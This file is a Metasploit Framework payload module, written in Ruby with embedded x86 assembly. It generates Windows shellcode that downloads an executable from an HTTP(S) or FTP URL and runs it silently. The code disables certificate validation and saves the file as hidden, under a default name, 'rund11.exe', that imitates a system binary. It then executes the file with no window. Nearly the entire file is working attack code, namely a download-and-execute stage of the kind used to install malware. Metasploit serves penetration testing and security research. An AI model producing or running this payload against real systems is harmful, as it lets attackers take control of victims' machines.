##
# This file is part of the Metasploit Framework and may be subject to
# redistribution and commercial restrictions. Please see the Metasploit
# web site for more information on licensing and terms of use.
#   http://metasploit.com/
##


require 'msf/core'

module Metasploit3
  extend  Metasploit::Framework::Module::Ancestor::Handler

  include Msf::Payload::Windows
  include Msf::Payload::Single

  def initialize(info = {})
    super(merge_info(info,
      'Name'          => 'Windows Executable Download (http,https,ftp) and Execute',
      'Description'   => 'Download an EXE from an HTTP(S)/FTP URL and execute it',
      'Author'        =>
        [
          'corelanc0d3r <peter.ve[at]corelan.be>'
        ],
      'License'       => MSF_LICENSE,
      'Platform'      => 'win',
      'Arch'          => ARCH_X86
    ))

    # Register command execution options
    register_options(
      [
        OptString.new('URL', [true, "The pre-encoded URL to the executable" ,"https://localhost:443/evil.exe"]),
        OptString.new('EXE', [ true, "Filename to save & run executable on target system", "rund11.exe" ])
      ], self.class)
  end

  #
  # Construct the payload
  #
  def generate

    target_uri = datastore['URL'] || ""
    filename = datastore['EXE'] || ""
    proto = "https"
    dwflags_asm = "push (0x80000000 | 0x04000000 | 0x00800000 | 0x00200000 |0x00001000 |0x00002000 |0x00000200) ; dwFlags\n"
      #;0x80000000 |        ; INTERNET_FLAG_RELOAD
      #;0x04000000 |        ; INTERNET_NO_CACHE_WRITE
      #;0x00800000 |        ; INTERNET_FLAG_SECURE
      #;0x00200000 |        ; INTERNET_FLAG_NO_AUTO_REDIRECT
      #;0x00001000 |        ; INTERNET_FLAG_IGNORE_CERT_CN_INVALID
      #;0x00002000 |        ; INTERNET_FLAG_IGNORE_CERT_DATE_INVALID
      #;0x00000200          ; INTERNET_FLAG_NO_UI"

    exitfuncs = {
        "PROCESS"   => 0x56A2B5F0,	#kernel32.dll!ExitProcess
        "THREAD"    => 0x0A2A1DE0,	#kernel32.dll!ExitThread
        "SEH"       => 0x00000000,	#we don't care
        "NONE"      => 0x00000000	#we don't care
        }

    protoflags = {
        "http"	=> 0x3,
        "https"	=> 0x3,
        "ftp"	=> 0x1
        }

    exitfunc = datastore['EXITFUNC'].upcase

    if exitfuncs[exitfunc]
      exitasm = case exitfunc
        when "SEH" then "xor eax,eax\ncall eax"
        when "NONE" then "jmp end"	# don't want to load user32.dll for GetLastError
        else "push 0x0\npush 0x%x\ncall ebp" % exitfuncs[exitfunc]
      end
    end

    # parse URL and break it down in
    # - remote host
    # - port
    # - /path/to/file

    server_uri  = ''
    server_host = ''
    port_nr     = 443	# default

    if target_uri.length > 0

      # get desired protocol
      if target_uri =~ /^http:/
        proto = "http"
        port_nr = 80
        dwflags_asm = "push (0x80000000 | 0x04000000 | 0x00400000 | 0x00200000 |0x00001000 |0x00002000 |0x00000200) ; dwFlags\n"
          #;0x00400000 |        ; INTERNET_FLAG_KEEP_CONNECTION
      end

      if target_uri =~ /^ftp:/
        proto = "ftp"
        port_nr = 21
        dwflags_asm = "push (0x80000000 | 0x04000000 | 0x00200000 |0x00001000 |0x00002000 |0x00000200) ; dwFlags\n"
      end

      # sanitize the input
      target_uri = target_uri.gsub('http://','')	#don't care about protocol
      target_uri = target_uri.gsub('https://','')	#don't care about protocol
      target_uri = target_uri.gsub('ftp://','')	#don't care about protocol

      server_info = target_uri.split("/")

      # did user specify a port ?
      server_parts = server_info[0].split(":")
      if server_parts.length > 1
        port_nr = Integer(server_parts[1])
      end

      # actual target host
      server_host = server_parts[0]

      # get /path/to/remote/exe

      for i in (1..server_info.length-1)
        server_uri << "/"
        server_uri << server_info[i]
      end

    end

    # get protocol specific stuff

    #create actual payload
    payload_data = <<EOS
  cld
  call start
; Stephen Fewer's block_api
; block_api code (Stephen Fewer)
api_call:
  pushad                 ; We preserve all the registers for the caller, bar EAX and ECX.
  mov ebp, esp           ; Create a new stack frame
  xor edx, edx           ; Zero EDX
  mov edx, fs:[edx+48]   ; Get a pointer to the PEB
  mov edx, [edx+12]      ; Get PEB->Ldr
  mov edx, [edx+20]      ; Get the first module from the InMemoryOrder module list
next_mod:
  mov esi, [edx+40]      ; Get pointer to modules name (unicode string)
  movzx ecx, word [edx+38] ; Set ECX to the length we want to check
  xor edi, edi           ; Clear EDI which will store the hash of the module name
loop_modname:              ;
  xor eax, eax           ; Clear EAX
  lodsb                  ; Read in the next byte of the name
  cmp al, 'a'            ; Some versions of Windows use lower case module names
  jl not_lowercase       ;
  sub al, 0x20           ; If so normalise to uppercase
not_lowercase:             ;
  ror edi, 13            ; Rotate right our hash value
  add edi, eax           ; Add the next byte of the name
  loop loop_modname      ; Loop untill we have read enough
  ; We now have the module hash computed
  push edx               ; Save the current position in the module list for later
  push edi               ; Save the current module hash for later
  ; Proceed to iterate the export address table,
  mov edx, [edx+16]      ; Get this modules base address
  mov eax, [edx+60]      ; Get PE header
  add eax, edx           ; Add the modules base address
  mov eax, [eax+120]     ; Get export tables RVA
  test eax, eax          ; Test if no export address table is present
  jz get_next_mod1       ; If no EAT present, process the next module
  add eax, edx           ; Add the modules base address
  push eax               ; Save the current modules EAT
  mov ecx, [eax+24]      ; Get the number of function names
  mov ebx, [eax+32]      ; Get the rva of the function names
  add ebx, edx           ; Add the modules base address
  ; Computing the module hash + function hash
get_next_func:             ;
  jecxz get_next_mod     ; When we reach the start of the EAT (we search backwards), process the next module
  dec ecx                ; Decrement the function name counter
  mov esi, [ebx+ecx*4]   ; Get rva of next module name
  add esi, edx           ; Add the modules base address
  xor edi, edi           ; Clear EDI which will store the hash of the function name
  ; And compare it to the one we want
loop_funcname:             ;
  xor eax, eax           ; Clear EAX
  lodsb                  ; Read in the next byte of the ASCII function name
  ror edi, 13            ; Rotate right our hash value
  add edi, eax           ; Add the next byte of the name
  cmp al, ah             ; Compare AL (the next byte from the name) to AH (null)
  jne loop_funcname      ; If we have not reached the null terminator, continue
  add edi, [ebp-8]       ; Add the current module hash to the function hash
  cmp edi, [ebp+36]      ; Compare the hash to the one we are searchnig for
  jnz get_next_func      ; Go compute the next function hash if we have not found it
  ; If found, fix up stack, call the function and then value else compute the next one...
  pop eax                ; Restore the current modules EAT
  mov ebx, [eax+36]      ; Get the ordinal table rva
  add ebx, edx           ; Add the modules base address
  mov cx, [ebx+2*ecx]    ; Get the desired functions ordinal
  mov ebx, [eax+28]      ; Get the function addresses table rva
  add ebx, edx           ; Add the modules base address
  mov eax, [ebx+4*ecx]   ; Get the desired functions RVA
  add eax, edx           ; Add the modules base address to get the functions actual VA
  ; We now fix up the stack and perform the call to the desired function...
finish:
  mov [esp+36], eax      ; Overwrite the old EAX value with the desired api address for the upcoming popad
  pop ebx                ; Clear off the current modules hash
  pop ebx                ; Clear off the current position in the module list
  popad                  ; Restore all of the callers registers, bar EAX, ECX and EDX which are clobbered
  pop ecx                ; Pop off the origional return address our caller will have pushed
  pop edx                ; Pop off the hash value our caller will have pushed
  push ecx               ; Push back the correct return value
  jmp eax                ; Jump into the required function
  ; We now automagically return to the correct caller...
get_next_mod:              ;
  pop eax                ; Pop off the current (now the previous) modules EAT
get_next_mod1:             ;
  pop edi                ; Pop off the current (now the previous) modules hash
  pop edx                ; Restore our position in the module list
  mov edx, [edx]         ; Get the next module
  jmp.i8 next_mod        ; Process this module

; actual routine
start:
  pop ebp                ; get ptr to block_api routine
; based on HDM's block_reverse_https.asm
load_wininet:
  push 0x0074656e        ; Push the bytes 'wininet',0 onto the stack.
  push 0x696e6977        ; ...
  mov esi, esp           ; Save a pointer to wininet
  push esp               ; Push a pointer to the "wininet" string on the stack.
  push 0x0726774C        ; hash( "kernel32.dll", "LoadLibraryA" )
  call ebp               ; LoadLibraryA( "wininet" )

internetopen:
  xor edi,edi
  push edi               ; DWORD dwFlags
  push edi               ; LPCTSTR lpszProxyBypass
  push edi               ; LPCTSTR lpszProxyName
  push edi               ; DWORD dwAccessType (PRECONFIG = 0)
  push esi               ; LPCTSTR lpszAgent ("wininet\x00")
  push 0xA779563A        ; hash( "wininet.dll", "InternetOpenA" )
  call ebp

  jmp.i8 dbl_get_server_host

internetconnect:
  pop ebx                ; Save the hostname pointer
  xor ecx, ecx
  push ecx               ; DWORD_PTR dwContext (NULL)
  push ecx               ; dwFlags
  push #{protoflags[proto]}	; DWORD dwService (INTERNET_SERVICE_HTTP or INTERNET_SERVICE_FTP)
  push ecx               ; password
  push ecx               ; username
  push #{port_nr}        ; PORT
  push ebx               ; HOSTNAME
  push eax               ; HINTERNET hInternet
  push 0xC69F8957        ; hash( "wininet.dll", "InternetConnectA" )
  call ebp

  jmp.i8 get_server_uri

httpopenrequest:
  pop ecx
  xor edx, edx            ; NULL
  push edx                ; dwContext (NULL)
  #{dwflags_asm}          ; dwFlags
  push edx                ; accept types
  push edx                ; referrer
  push edx                ; version
  push ecx                ; url
  push edx                ; method
  push eax                ; hConnection
  push 0x3B2E55EB         ; hash( "wininet.dll", "HttpOpenRequestA" )
  call ebp
  mov esi, eax            ; hHttpRequest

set_retry:
  push 0x10
  pop ebx

; InternetSetOption (hReq, INTERNET_OPTION_SECURITY_FLAGS, &dwFlags, sizeof (dwFlags) );
set_security_options:
  push 0x00003380
  mov eax, esp
  push 4                 ; sizeof(dwFlags)
  push eax               ; &dwFlags
  push 31                ; DWORD dwOption (INTERNET_OPTION_SECURITY_FLAGS)
  push esi               ; hRequest
  push 0x869E4675        ; hash( "wininet.dll", "InternetSetOptionA" )
  call ebp

httpsendrequest:
  xor edi, edi
  push edi               ; optional length
  push edi               ; optional
  push edi               ; dwHeadersLength
  push edi               ; headers
  push esi               ; hHttpRequest
  push 0x7B18062D        ; hash( "wininet.dll", "HttpSendRequestA" )
  call ebp
  test eax,eax
  jnz create_file

try_it_again:
  dec ebx
  jz thats_all_folks	; failure -> exit
  jmp.i8 set_security_options

dbl_get_server_host:
  jmp get_server_host

get_server_uri:
  call httpopenrequest

server_uri:
  db "#{server_uri}", 0x00

create_file:
  jmp.i8 get_filename

get_filename_return:
  xor eax,eax       ; zero eax
  pop edi           ; ptr to filename
  push eax          ; hTemplateFile
  push 2            ; dwFlagsAndAttributes (Hidden)
  push 2            ; dwCreationDisposition (CREATE_ALWAYS)
  push eax          ; lpSecurityAttributes
  push 2            ; dwShareMode
  push 2            ; dwDesiredAccess
  push edi          ; lpFileName
  push 0x4FDAF6DA   ; kernel32.dll!CreateFileA
  call ebp

download_prep:
  xchg eax, ebx     ; place the file handle in ebx
  xor eax,eax       ; zero eax
  mov ax,0x304      ; we'll download 0x300 bytes at a time
  sub esp,eax       ; reserve space on stack

download_more:
  push esp          ; &bytesRead
  lea ecx,[esp+0x8] ; target buffer
  xor eax,eax
  mov ah,0x03       ; eax => 300
  push eax          ; read length
  push ecx          ; target buffer on stack
  push esi          ; hRequest
  push 0xE2899612   ; hash( "wininet.dll", "InternetReadFile" )
  call ebp

  test eax,eax        ; download failed? (optional?)
  jz thats_all_folks  ; failure -> exit

  pop eax             ; how many bytes did we retrieve ?

  test eax,eax        ; optional?
  je close_and_run    ; continue until it returns 0

write_to_file:
  push 0              ; lpOverLapped
  push esp            ; lpNumberOfBytesWritten
  push eax            ; nNumberOfBytesToWrite
  lea eax,[esp+0xc]   ; get pointer to buffer
  push eax            ; lpBuffer
  push ebx            ; hFile
  push 0x5BAE572D     ; kernel32.dll!WriteFile
  call ebp
  sub esp,4           ; set stack back to where it was
  jmp.i8 download_more

close_and_run:
  push ebx
  push 0x528796C6    ; kernel32.dll!CloseHandle
  call ebp

execute_file:
  push 0             ; don't show
  push edi           ; lpCmdLine
  push 0x876F8B31    ; kernel32.dll!WinExec
  call ebp

thats_all_folks:
  #{exitasm}

get_filename:
  call get_filename_return
  db "#{filename}",0x00

get_server_host:
  call internetconnect

server_host:
  db "#{server_host}", 0x00
end:
EOS
    self.assembly = payload_data
    super
  end
end
